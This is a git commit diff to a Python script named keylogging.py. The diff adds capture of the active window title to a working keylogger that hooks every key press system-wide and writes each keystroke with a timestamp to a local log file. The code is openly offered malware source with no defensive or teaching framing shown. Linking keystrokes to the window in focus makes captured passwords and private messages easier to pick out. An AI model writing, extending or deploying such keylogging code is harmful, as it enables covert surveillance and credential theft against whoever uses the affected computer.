81557c570c4bd3755958a5ed307564b910d208b6
abdulhaseeb-user <haseebfaisal2002@gmail.com>
2024-04-26 12:02:49 +0500

    Updated

--- Keylogger/keylogging.py
+++ Keylogger/keylogging.py
@@ -1,20 +1,26 @@
 import datetime
 import keyboard
+import pygetwindow as gw
 
-# Path to the log file to store keystrokes
 log_file = "keystroke_log.txt"
 
+def get_active_window_title():
+    active_window = gw.getActiveWindow()
+    if active_window is not None:
+        return active_window.title
+    else:
+        return "Unknown"
+
 def on_press(event):
-    # Write keystroke to log file
+    # Get the active window title
+    window_title = get_active_window_title()
+    
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open(log_file, 'a') as f:
-        f.write(f"{timestamp}: {event.name}\n")
+        f.write(f"{timestamp}: {event.name} - {window_title}\n")
 
 try:
-    # Start the listener for key press events
     keyboard.on_press(on_press)
-
-    # Keep the program running
     keyboard.wait()
     
 except KeyboardInterrupt:
